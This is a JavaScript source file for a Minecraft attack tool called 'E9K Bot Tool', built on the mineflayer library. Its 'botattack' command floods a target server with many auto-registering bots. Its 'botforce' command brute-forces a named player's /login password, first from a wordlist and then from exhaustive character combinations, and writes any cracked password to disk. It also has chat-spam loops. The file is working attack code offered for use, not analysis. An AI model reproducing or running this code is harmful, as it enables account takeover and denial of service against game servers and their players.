const mineflayer = require('mineflayer');
const readline = require('readline');
const fs = require('fs');
const path = require('path');

let bots = {};
let spamIntervals = {};
let lastLoggedMessage = ""; 
let chatLoggerBotName = null; 
const password = "e9ktool2958";

// Botforce kontrol değişkenleri
let forceRunning = false;
let forceBotInstance = null;

const baseNames = [
    "Shadow", "Viper", "Ghost", "Ninja", "Falcon", "Titan", "Storm", "Blaze", "Cyber", "Dark", 
    "Frost", "Iron", "Alpha", "Omega", "Zero", "Echo", "Hunter", "Sniper", "Dragon", "Phoenix",
    "Demir", "Kaan", "Bora", "Kuzey", "Ayaz", "Alparslan", "Yigit", "Atlas", "Kartal", "Sahin",
    "Kilic", "Yildirim", "Savas", "Mert", "Efe", "Arda", "Kerem", "Eren", "Umut", "Cem",
    "Reaper", "Vortex", "Stalker", "Venom", "Rogue", "Matrix", "Nova", "Chaos", "Pulsar", "Zenith",
    "Spectre", "Titanium", "Goliath", "Apex", "Stellar", "Nebula", "Quantum", "Volkan", "Turan", "Asena",
    "Phantom", "Havoc", "Nexus", "Syndicate", "Stryker", "Glitch", "Catalyst", "Overlord", "Banshee", "Wraith",
    "Hazard", "Riot", "Eclipse", "Sentinel", "Nomad", "Maverick", "Cursed", "Revenant", "Valiant", "Cipher",
    "Pars", "Kaplan", "Bozkurt", "Akrep", "Ejder", "Firtina", "Kasirga", "Simsek", "Boran", "Pusat",
    "Akinci", "Celik", "Timur", "Atilla", "Metehan", "Cengiz", "Gokturk", "Karakurt", "Tugay", "Sancak", "YusufTe"
];

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '\x1b[1;35mE9K-Tool>\x1b[0m '
});

function log(message, type = "LOG") {
    if (!message) return;
    
    const time = new Date().toLocaleTimeString('tr-TR', { hour12: false });
    process.stdout.write('\r\x1b[K'); 
    
    let prefix = `\x1b[1;30m[${time} INFO / BİLGİ]:\x1b[0m `; 
    if (type === "SİSTEM") prefix = `\x1b[1;32m[${time} SYSTEM / SİSTEM]:\x1b[0m `;
    else if (type === "GİDEN") prefix = `\x1b[1;36m[${time} OUTGOING / GİDEN]:\x1b[0m `;
    else if (type === "HATA") prefix = `\x1b[1;31m[${time} ERROR / HATA]:\x1b[0m `;
    else if (type === "BAŞARI") prefix = `\x1b[1;33m[${time} SUCCESS / BAŞARI]:\x1b[0m `;
    else if (type === "SERVER") prefix = `\x1b[1;34m[${time} SERVER / SUNUCU]:\x1b[0m `;

    process.stdout.write(`${prefix}${message}\x1b[0m\n`);
    if (typeof rl !== 'undefined') rl.prompt(true);
}

function drawGUI() {
    console.clear();
    console.log("\x1b[1;35m" + "╔" + "═".repeat(58) + "╗");
    console.log("║                     ⚡ E9K BOT TOOL ⚡                    ║");
    console.log("╠" + "═".repeat(58) + "╣\x1b[0m");
    console.log("\x1b[32m  [+] botattack [ip] [port] [count] [ver] [true/false]             \x1b[0m");
    console.log("\x1b[32m  [+] botadd    [ip] [port] [name/isim] [ver/sürüm]     \x1b[0m");
    console.log("\x1b[36m  [+] botafk    [ip] [port] [name/isim] [ver/sürüm]     \x1b[0m");
    console.log("\x1b[31m  [+] botforce  [ip] [port] [name/isim] [ver/sürüm]     \x1b[0m");
    console.log("\x1b[34m  [>] cmd [all/bot] [cmd/komut] | say [all/bot] [msg/mesaj]      \x1b[0m");
    console.log("\x1b[35m  [~] spam [all/bot] [msg] | stopspam [all/bot]      \x1b[0m");
    console.log("\x1b[33m  [#] list | exitbot                                         \x1b[0m");
    console.log("\x1b[1;35m" + "╚" + "═".repeat(58) + "╝" + "\x1b[0m\n");
    rl.prompt();
}

drawGUI();

let globalConfig = { ip: "", port: "", version: "" };

function createBot(ip, port, name, version, isAfk = false, noReconnect = false) {
    globalConfig = { ip, port, version };

    const bot = mineflayer.createBot({
        host: ip,
        port: parseInt(port),
        username: name,
        version: version || "1.21.1",
        hideErrors: true,
        brand: 'vanilla',
        resourcePack: 'ignore',
        checkTimeoutInterval: 60000 
    });

    bot._client.on('packet', (data, metadata) => {
        if (metadata.name === 'resource_pack_send' || metadata.name === 'add_resource_pack') {
            const packUuid = data.uuid;
            bot._client.write('resource_pack_receive', { uuid: packUuid, result: 0 });
            setTimeout(() => {
                if (bot._client && bot._client.state === 'play') {
                    bot._client.write('resource_pack_receive', { uuid: packUuid, result: 3 });
                }
            }, 200);
        }

        if (metadata.name === 'login_plugin_request') {
            bot._client.write('login_plugin_response', {
                messageId: data.messageId,
                data: Buffer.alloc(0)
            });
        }
    });

    bot.on('message', (jsonMsg, position) => {
        if (chatLoggerBotName !== name) return;

        if (position === 'system' || position === 'game_info' || position === 'chat') {
            const msg = jsonMsg.toString().trim();
            if (msg.length > 0) {
                log(msg, "SERVER");
            }
        }
    });

    bot.on('spawn', () => {
        if (!bots[name]) {
            bots[name] = bot;
            log(`${name} connected to the server. / sunucuya bağlandı.`, "SİSTEM");
            
            if (!chatLoggerBotName) {
                chatLoggerBotName = name;
            }

            if (!isAfk) {
                setTimeout(() => {
                    if (bots[name]) {
                        bot.chat(`/register ${password} ${password}`);
                        setTimeout(() => {
                            if (bots[name]) bot.chat(`/login ${password}`);
                        }, 300);
                    }
                }, 500);
            }

            if (isAfk) {
                bot.afkInterval = setInterval(() => {
                    if (bots[name]) {
                        bot.setControlState('jump', true);
                        setTimeout(() => bot.setControlState('jump', false), 500);
                    }
                }, 60000);
            }
        }
    });

    bot.on('kicked', (reason) => {
        if (bot.afkInterval) clearInterval(bot.afkInterval);
        delete bots[name];
        
        if (chatLoggerBotName === name) {
            chatLoggerBotName = null;
            const remaining = Object.keys(bots).filter(k => k !== '_session' && k !== name);
            if (remaining.length > 0) chatLoggerBotName = remaining[0];
        }

        const lowerName = name.toLowerCase();
        if (spamIntervals[lowerName]) {
            clearInterval(spamIntervals[lowerName]);
            delete spamIntervals[lowerName];
        }

        let kickMsg = "";
        try {
            const parsed = (typeof reason === 'string') ? JSON.parse(reason) : reason;
            kickMsg = parsed.text || parsed.extra?.[0]?.text || JSON.stringify(reason);
        } catch (e) { kickMsg = reason; }
        log(`${name} kicked! Reason / atıldı! Sebep: ${kickMsg}`, "HATA");

        if (globalConfig.ip && !bot._isForceBot && !noReconnect) {
            log(`${name} will try to reconnect in 4.5s... / 4.5s içinde tekrar giriş denenecek...`, "SİSTEM");
            setTimeout(() => {
                if (globalConfig.ip) createBot(globalConfig.ip, globalConfig.port, name, globalConfig.version, isAfk, noReconnect);
            }, 4500);
        }
    });

    bot.on('error', (err) => {
        if (bot.afkInterval) clearInterval(bot.afkInterval);
        delete bots[name];

        if (chatLoggerBotName === name) {
            chatLoggerBotName = null;
            const remaining = Object.keys(bots).filter(k => k !== '_session' && k !== name);
            if (remaining.length > 0) chatLoggerBotName = remaining[0];
        }

        const lowerName = name.toLowerCase();
        if (spamIntervals[lowerName]) {
            clearInterval(spamIntervals[lowerName]);
            delete spamIntervals[lowerName];
        }

        if (err.code === 'ECONNRESET') {
            log(`${name}: Connection reset, retrying. / Bağlantı sıfırlandı, tekrar dene.`, "HATA");
        } else {
            log(`${name} error / hatası: ${err.message}`, "HATA");
        }
    });

    return bot;
}

function startBotForce(ip, port, name, version) {
    const botDir = path.join(__dirname, 'BotForce');
    if (!fs.existsSync(botDir)) {
        fs.mkdirSync(botDir, { recursive: true });
    }

    const passFilePath = path.join(botDir, 'botpass.txt');
    let passwords = [];

    if (!fs.existsSync(passFilePath)) {
        const defaultContent = "{} Kendi denemek istediğiniz şifreleri alt alta yazabilirsiniz. (Her satır 1 şifreye denk gelir)\n" +
                              "{} You can write the passwords you want to try line by line below. (Each line corresponds to 1 password)\n" +
                              "123456\n";
        fs.writeFileSync(passFilePath, defaultContent, 'utf8');
        log("BotForce/botpass.txt created. / BotForce/botpass.txt dosyası oluşturuldu.", "SİSTEM");
    }

    const fileLines = fs.readFileSync(passFilePath, 'utf8').split(/\r?\n/);
    for (const line of fileLines) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('{}')) {
            passwords.push(trimmed);
        }
    }

    log(`Loaded ${passwords.length} passwords from botpass.txt / botpass.txt dosyasından ${passwords.length} şifre yüklendi.`, "SİSTEM");

    let currentPassIndex = 0;
    let currentPassword = "";
    let isFound = false;
    forceRunning = true;
    let currentTimeout = null;
    let bruteInitialized = false;

    function tryNextPassword(shouldAdvance = false) {
        if (!forceRunning || isFound) return;

        if (shouldAdvance) {
            if (currentPassIndex < passwords.length) {
                currentPassIndex++;
            } else {
                bruteInitialized = false;
            }
        }

        if (currentPassIndex < passwords.length) {
            currentPassword = passwords[currentPassIndex];
        } else {
            if (!bruteInitialized || shouldAdvance) {
                currentPassword = getNextBrutePassword();
                bruteInitialized = true;
            }
            if (!currentPassword) {
                log("All brute-force combinations exhausted! Password not found. / Tüm kombinasyonlar tükendi, şifre bulunamadı.", "HATA");
                forceRunning = false;
                return;
            }
        }

        if (forceBotInstance) {
            try { forceBotInstance.end(); } catch (e) {}
            forceBotInstance = null;
        }

        if (!forceRunning) return;

        forceBotInstance = mineflayer.createBot({
            host: ip,
            port: parseInt(port),
            username: name,
            version: version || "1.21.1",
            hideErrors: true,
            brand: 'vanilla',
            resourcePack: 'ignore',
            checkTimeoutInterval: 60000
        });

        forceBotInstance._isForceBot = true;
        let loginSent = false;
        let passwordProcessed = false;

        function processServerResponse(text, isKick = false) {
            if (!forceRunning || isFound || passwordProcessed) return;
            const lowerMsg = text.toLowerCase();

            if (!isKick && (
                lowerMsg.includes('success') || 
                lowerMsg.includes('başarılı') || 
                lowerMsg.includes('basarili') || 
                lowerMsg.includes('doğrulandı') || 
                lowerMsg.includes('dogrulandi') || 
                lowerMsg.includes('logged in') || 
                lowerMsg.includes('hosgeldiniz') ||
                lowerMsg.includes('hoşgeldiniz') ||
                lowerMsg.includes('welcome') ||
                lowerMsg.includes('giriş yapıldı') ||
                lowerMsg.includes('giris yapildi') ||
                lowerMsg.includes('başarıyla') ||
                lowerMsg.includes('basariyla')
            )) {
                passwordProcessed = true;
                isFound = true;
                forceRunning = false;
                if (currentTimeout) clearTimeout(currentTimeout);
                if (forceBotInstance && forceBotInstance._responseTimeout) clearTimeout(forceBotInstance._responseTimeout);
                log(`PASSWORD FOUND! / ŞİFRE BULUNDU! Account / Hesap: ${name} | Password / Şifre: ${currentPassword}`, "BAŞARI");

                const accountDir = path.join(botDir, 'Account', ip);
                if (!fs.existsSync(accountDir)) {
                    fs.mkdirSync(accountDir, { recursive: true });
                }
                const accountFilePath = path.join(accountDir, `${name}.txt`);
                fs.writeFileSync(accountFilePath, `Password: ${currentPassword}`, 'utf8');
                log(`Credentials saved to / Bilgiler kaydedildi: ${accountFilePath}`, "BAŞARI");

                try { forceBotInstance.end(); } catch (e) {}
                return true;
            }

            if (
                lowerMsg.includes('wrong') || 
                lowerMsg.includes('incorrect') || 
                lowerMsg.includes('yanlış') || 
                lowerMsg.includes('yanlis') || 
                lowerMsg.includes('hatalı') || 
                lowerMsg.includes('hatali') ||
                lowerMsg.includes('eşleşmiyor')
            ) {
                passwordProcessed = true;
                if (currentTimeout) clearTimeout(currentTimeout);
                if (forceBotInstance && forceBotInstance._responseTimeout) clearTimeout(forceBotInstance._responseTimeout);
                log(`Wrong password detected (${isKick ? 'Kick' : 'Chat'}), moving to next... / Yanlış şifre algılandı, sonraki şifreye geçiliyor...`, "HATA");
                try { forceBotInstance.end(); } catch (e) {}
                setTimeout(() => tryNextPassword(true), 4000); 
                return true;
            }

            return false;
        }

        forceBotInstance.on('spawn', () => {
            log(`${name} connected to server. Waiting for stability... / Sunucuya bağlandı, kararlılık bekleniyor...`, "SİSTEM");

            if (currentTimeout) clearTimeout(currentTimeout);
            currentTimeout = setTimeout(() => {
                if (!forceRunning || isFound || !forceBotInstance || loginSent) return;
                if (forceBotInstance._client && forceBotInstance._client.state === 'play' && typeof forceBotInstance.chat === 'function') {
                    try {
                        loginSent = true;
                        forceBotInstance.chat(`/login ${currentPassword}`);
                        log(`[OUTGOING / GİDEN]: /login ${currentPassword}`, "GİDEN");
                    } catch (e) {}
                }
            }, 1500);

            const responseTimeout = setTimeout(() => {
                if (forceRunning && !isFound && !loginSent && !passwordProcessed) {
                    log(`Response timeout for password ${currentPassword}, retrying same... / Zaman aşımı, aynı şifre tekrar deneniyor...`, "HATA");
                    try { forceBotInstance.end(); } catch (e) {}
                    setTimeout(() => tryNextPassword(false), 4000);
                }
            }, 8000);
            
            forceBotInstance._responseTimeout = responseTimeout;
        });

        forceBotInstance.on('message', (jsonMsg, position) => {
            if (!forceRunning || isFound || passwordProcessed) return;
            const msg = jsonMsg.toString().trim();
            if (position === 'system' || position === 'game_info' || position === 'chat') {
                if (msg.length > 0) {
                    let displayMsg = msg;
                    if (displayMsg.includes('Giriş başarılı') || displayMsg.includes('giris basarili')) {
                        displayMsg = `${msg} / [En] Login successful!`;
                    }
                    log(displayMsg, "SERVER");

                    processServerResponse(msg, false);
                }
            }
        });

        forceBotInstance.on('kicked', (reason) => {
            if (!forceRunning || isFound || passwordProcessed) return;
            if (currentTimeout) clearTimeout(currentTimeout);
            if (forceBotInstance && forceBotInstance._responseTimeout) clearTimeout(forceBotInstance._responseTimeout);

            let kickMsg = "";
            try {
                const parsed = (typeof reason === 'string') ? JSON.parse(reason) : reason;
                kickMsg = parsed.text || parsed.extra?.[0]?.text || JSON.stringify(reason);
            } catch (e) { kickMsg = reason; }

            log(`Bot kicked from server! Reason / Sunucudan atıldı: ${kickMsg}`, "HATA");

            if (processServerResponse(kickMsg, true)) {
                return; 
            }

            let waitTime = 4500;
            const lowerKick = kickMsg.toLowerCase();

            if (lowerKick.includes('another location') || lowerKick.includes('başka bir yerden')) {
                log(`Another login detected, retrying the same password... / Başka bir oturum algılandı, aynı şifre tekrar deneniyor...`, "SİSTEM");
            } else if (lowerKick.includes('too fast') || lowerKick.includes('hızlı')) {
                log(`Rate limit detected, waiting longer before retry... / Çok hızlı giriş algılandı, bekleniyor...`, "SİSTEM");
                waitTime = 6000;
            }

            setTimeout(() => {
                if (forceRunning && !isFound) {
                    tryNextPassword(false);
                }
            }, waitTime);
        });

        forceBotInstance.on('error', (err) => {
            if (!forceRunning || isFound || passwordProcessed) return;
            if (currentTimeout) clearTimeout(currentTimeout);
            if (forceBotInstance && forceBotInstance._responseTimeout) clearTimeout(forceBotInstance._responseTimeout);

            log(`Bot connection error / Bağlantı hatası: ${err.message}`, "HATA");

            setTimeout(() => {
                if (forceRunning && !isFound) {
                    tryNextPassword(false); 
                }
            }, 4500);
        });
    }

    tryNextPassword(false);
}

// Kademeli Brute-force Sıralaması
let bruteLength = 6;
let brutePhase = 0; 
let bruteIndices = [0, 0, 0, 0, 0, 0];

const charSets = [
    "0123456789",                                         
    "abcdefghijklmnopqrstuvwxyz",                         
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",                         
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_+-=\\'\\\"\\?/][}{.,<>" 
];

function getNextBrutePassword() {
    if (bruteLength > 20) return null;

    const currentSet = charSets[brutePhase];
    let pwd = "";
    for (let i = 0; i < bruteLength; i++) {
        pwd += currentSet[bruteIndices[i]];
    }

    let index = bruteLength - 1;
    while (index >= 0) {
        bruteIndices[index]++;
        if (bruteIndices[index] < currentSet.length) {
            break;
        }
        bruteIndices[index] = 0;
        index--;
    }

    if (index < 0) {
        brutePhase++;
        if (brutePhase >= charSets.length) {
            brutePhase = 0;
            bruteLength++; 
            bruteIndices = new Array(bruteLength).fill(0);
        } else {
            bruteIndices = new Array(bruteLength).fill(0);
        }
    }

    return pwd;
}

rl.on('line', (line) => {
    const input = line.trim();
    if (!input) { rl.prompt(); return; }
    const args = input.split(' ');
    const command = args[0].toLowerCase();

    if (command === 'botattack' || command === 'botadd' || command === 'botafk' || command === 'botforce') {
        if (Object.keys(bots).length > 0 && !bots._session && command !== 'botforce') {
            log("Clear existing bots with 'exitbot' first! / Önce mevcut botları 'exitbot' ile temizle!", "HATA");
        } else {
            if (command === 'botattack') {
                const ip = args[1];
                const port = args[2];
                const count = args[3];
                let version = undefined;
                let randOpt = "true";

                const extraArgs = args.slice(4);
                for (const arg of extraArgs) {
                    const lower = arg.toLowerCase();
                    if (lower === 'true' || lower === 'false') {
                        randOpt = lower;
                    } else {
                        version = arg;
                    }
                }

                if (!count) {
                    log("Invalid syntax! Use: botattack [ip] [port] [count] [version] [true/false]", "HATA");
                    rl.prompt();
                    return;
                }

                const nameFilePath = path.join(__dirname, 'botname.txt');
                if (!fs.existsSync(nameFilePath)) {
                    const defaultNameContent = "{} Kendi isimlerinizi alt alta yazabilirsiniz. (Her satır 1 isme denk gelir)\n" +
                                              "{} You can write the names you want to use line by line below. (Each line corresponds to 1 name)\n" +
                                              "Shadow\nViper\nGhost\nNinja\nFalcon\nTitan\nStorm\nBlaze\nCyber\nDark\n";
                    fs.writeFileSync(nameFilePath, defaultNameContent, 'utf8');
                    log("botname.txt created. / botname.txt dosyası oluşturuldu.", "SİSTEM");
                }

                let fileNames = [];
                if (fs.existsSync(nameFilePath)) {
                    fileNames = fs.readFileSync(nameFilePath, 'utf8')
                        .split(/\r?\n/)
                        .map(l => l.trim())
                        .filter(l => l && !l.startsWith('{}'));
                }

                let current = 1;
                const total = parseInt(count);
                const sessionTime = Date.now();
                bots._session = sessionTime;
                let retries = {};

                function spawnNext() {
                    if (bots._session !== sessionTime) return;
                    if (current > total) {
                        log("All bot attempts completed! Protection active. / Tüm bot denemeleri tamamlandı! Koruma aktif.", "SİSTEM");
                        return;
                    }

                    let botName;
                    const fileIndex = current - 1;
                    if (fileNames.length > 0 && fileIndex < fileNames.length) {
                        botName = fileNames[fileIndex];
                    } else if (randOpt && randOpt.toLowerCase() !== 'false') {
                        const base = baseNames[Math.floor(Math.random() * baseNames.length)];
                        const chars = "abcdefghijklmnopqrstuvwxyz0123456789_";
                        const randStr = () => {
                            let len = Math.floor(Math.random() * 3) + 1;
                            let res = "";
                            for (let i = 0; i < len; i++) res += chars[Math.floor(Math.random() * chars.length)];
                            return res;
                        };
                        let mode = Math.floor(Math.random() * 3);
                        let pre = (mode === 0 || mode === 2) ? randStr() : "";
                        let suf = (mode === 1 || mode === 2) ? randStr() : "";
                        botName = pre + base + suf;
                    } else {
                        botName = `E9KTool${current}`;
                    }

                    if (retries[botName] === undefined) retries[botName] = 0;

                    log(`[${current}/${total}] Sending ${botName}... / ${botName} gönderiliyor...`, "SİSTEM");

                    const bot = createBot(ip, port, botName, version, false, true);
                    let botHandled = false;

                    bot.on('spawn', () => {
                        if (botHandled) return;
                        botHandled = true;

                        current++;
                        setTimeout(() => spawnNext(), 4500); // 4.5 saniye bekleme süresi eklendi
                    });

                    bot.on('kicked', (reason) => {
                        if (botHandled) return;
                        botHandled = true;

                        retries[botName]++;
                        if (retries[botName] < 2) {
                            log(`${botName} failed! Retrying (Attempt 2)... / başarısız! Tekrar deneniyor...`, "HATA");
                            setTimeout(() => {
                                if (bots._session !== sessionTime) return;
                                const retryBot = createBot(ip, port, botName, version, false, true);
                                let retryHandled = false;

                                retryBot.on('spawn', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });

                                retryBot.on('kicked', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    log(`${botName} failed after retry, skipping... / atlanıyor...`, "HATA");
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });

                                retryBot.on('error', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    log(`${botName} failed after error retry, skipping... / atlanıyor...`, "HATA");
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });
                            }, 2000);
                        } else {
                            log(`${botName} skipping... / atlanıyor...`, "HATA");
                            current++;
                            setTimeout(() => spawnNext(), 4500);
                        }
                    });

                    bot.on('error', (err) => {
                        if (botHandled) return;
                        botHandled = true;

                        retries[botName]++;
                        if (retries[botName] < 2) {
                            log(`${botName} error, retrying... / hata, tekrar deneniyor...`, "HATA");
                            setTimeout(() => {
                                if (bots._session !== sessionTime) return;
                                const retryBot = createBot(ip, port, botName, version, false, true);
                                let retryHandled = false;

                                retryBot.on('spawn', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });

                                retryBot.on('kicked', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    log(`${botName} failed after retry, skipping... / atlanıyor...`, "HATA");
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });

                                retryBot.on('error', () => {
                                    if (retryHandled) return;
                                    retryHandled = true;
                                    log(`${botName} failed after error retry, skipping... / atlanıyor...`, "HATA");
                                    current++;
                                    setTimeout(() => spawnNext(), 4500);
                                });
                            }, 2000);
                        } else {
                            log(`${botName} skipping... / atlanıyor...`, "HATA");
                            current++;
                            setTimeout(() => spawnNext(), 4500);
                        }
                    });
                }

                log(`Attack started: Protocol bypass active. / Saldırı başladı: Protokol bypass aktif.`, "SİSTEM");
                spawnNext();
            } else if (command === 'botadd') {
                createBot(args[1], args[2], args[3] || "Player", args[4], false, false);
            } else if (command === 'botafk') {
                createBot(args[1], args[2], args[3] || "PlayerAFK", args[4], true, false);
            } else if (command === 'botforce') {
                if (!args[1] || !args[2] || !args[3]) {
                    log("Invalid syntax! Use: botforce [ip] [port] [name] [version]", "HATA");
                } else {
                    startBotForce(args[1], args[2], args[3], args[4]);
                }
            }
        }
    } 
    else if (command === 'cmd' || command === 'say') {
        if (args.length < 3) {
            log("Invalid syntax! Use: " + command + " [all/botname] [message] / Geçersiz kullanım!", "HATA");
            rl.prompt();
            return;
        }

        const target = args[1];
        const text = args.slice(2).join(' ');
        if (!text) {
            log("Message/Command cannot be empty! / Mesaj boş olamaz!", "HATA");
            rl.prompt();
            return;
        }

        const isCmd = command === 'cmd';
        const finalMsg = (isCmd && !text.startsWith('/')) ? '/' + text : text;

        if (target.toLowerCase() === 'all') {
            const activeBots = Object.keys(bots).filter(k => k !== '_session');
            if (activeBots.length === 0) {
                log("No active bots found! / Aktif bot bulunamadı!", "HATA");
            } else {
                activeBots.forEach((name, index) => {
                    const bot = bots[name];
                    if (bot && typeof bot.chat === 'function') {
                        setTimeout(() => bot.chat(finalMsg), index * 1);
                    }
                });
                log(finalMsg, "GİDEN");
            }
        } else {
            const activeBots = Object.keys(bots).filter(k => k !== '_session');
            const matchedKey = activeBots.find(k => k.toLowerCase() === target.toLowerCase());
            if (matchedKey && bots[matchedKey] && typeof bots[matchedKey].chat === 'function') {
                bots[matchedKey].chat(finalMsg);
                log(`[${matchedKey}] ${finalMsg}`, "GİDEN");
            } else {
                log(`Bot not found: ${target} / Bot bulunamadı: ${target}`, "HATA");
            }
        }
    }
    else if (command === 'spam') {
        if (args.length < 3) {
            log("Invalid syntax! Use: spam [all/botname] [message] / Geçersiz kullanım!", "HATA");
            rl.prompt();
            return;
        }

        const target = args[1];
        const text = args.slice(2).join(' ');
        if (!text) {
            log("Message cannot be empty! / Mesaj boş olamaz!", "HATA");
            rl.prompt();
            return;
        }

        const targetLower = target.toLowerCase();
        const activeBots = Object.keys(bots).filter(k => k !== '_session');

        if (activeBots.length === 0) {
            log("No active bots found! / Aktif bot bulunamadı!", "HATA");
            rl.prompt();
            return;
        }

        if (targetLower === 'all') {
            activeBots.forEach((name) => {
                const lowerKey = name.toLowerCase();
                if (spamIntervals[lowerKey]) {
                    clearInterval(spamIntervals[lowerKey]);
                    delete spamIntervals[lowerKey];
                }

                spamIntervals[lowerKey] = setInterval(() => {
                    const bot = bots[name];
                    if (bot && typeof bot.chat === 'function') {
                        bot.chat(text);
                    } else {
                        clearInterval(spamIntervals[lowerKey]);
                        delete spamIntervals[lowerKey];
                    }
                }, 2000);
            });
            log(`Spam started for ALL bots: ${text}`, "SİSTEM");
        } else {
            const matchedKey = activeBots.find(k => k.toLowerCase() === targetLower);
            if (matchedKey) {
                const lowerKey = matchedKey.toLowerCase();
                if (spamIntervals[lowerKey]) {
                    clearInterval(spamIntervals[lowerKey]);
                    delete spamIntervals[lowerKey];
                }

                spamIntervals[lowerKey] = setInterval(() => {
                    const bot = bots[matchedKey];
                    if (bot && typeof bot.chat === 'function') {
                        bot.chat(text);
                    } else {
                        clearInterval(spamIntervals[lowerKey]);
                        delete spamIntervals[lowerKey];
                    }
                }, 2000);
                log(`Spam started for [${matchedKey}]: ${text}`, "SİSTEM");
            } else {
                log(`Bot not found: ${target} / Bot bulunamadı: ${target}`, "HATA");
            }
        }
    }
    else if (command === 'stopspam') {
        if (args.length < 2) {
            log("Invalid syntax! Use: stopspam [all/botname] / Geçersiz kullanım!", "HATA");
            rl.prompt();
            return;
        }

        const target = args[1].toLowerCase();

        if (target === 'all') {
            Object.keys(spamIntervals).forEach(key => {
                clearInterval(spamIntervals[key]);
            });
            spamIntervals = {};
            log("All spam loops stopped. / Tüm spam döngüleri durduruldu.", "SİSTEM");
        } else {
            const activeBots = Object.keys(bots).filter(k => k !== '_session');
            const matchedKey = activeBots.find(k => k.toLowerCase() === target);
            const lookupKey = matchedKey ? matchedKey.toLowerCase() : target;

            if (spamIntervals[lookupKey]) {
                clearInterval(spamIntervals[lookupKey]);
                delete spamIntervals[lookupKey];
                log(`Spam stopped for bot: ${matchedKey || target} / Botun spami durduruldu.`, "SİSTEM");
            } else {
                log(`No active spam found for: ${target} / Bu bot için aktif spam bulunamadı.`, "HATA");
            }
        }
    }
    else if (command === 'list') {
        const list = Object.keys(bots).filter(k => k !== '_session');
        log(`Active Bots / Aktif Botlar: ${list.join(', ') || 'None / Yok'}`, "SİSTEM");
    }
    else if (command === 'exitbot') {
        log("System resetting... / Sistem sıfırlanıyor...", "SİSTEM");
        
        forceRunning = false;
        if (forceBotInstance) {
            try { forceBotInstance.end(); } catch (e) {}
            forceBotInstance = null;
        }

        bots._session = null;
        globalConfig.ip = ""; 
        chatLoggerBotName = null;

        Object.keys(spamIntervals).forEach(key => clearInterval(spamIntervals[key]));
        spamIntervals = {};

        Object.keys(bots).forEach(key => {
            if (bots[key] && typeof bots[key].end === 'function') {
                if (bots[key].afkInterval) clearInterval(bots[key].afkInterval);
                try { bots[key].end(); } catch (e) {}
            }
        });
        bots = {};
        lastLoggedMessage = "";
        setTimeout(drawGUI, 1000);
    }
    else {
        log("Invalid command! / Geçersiz komut!", "HATA");
    }
    rl.prompt();
});
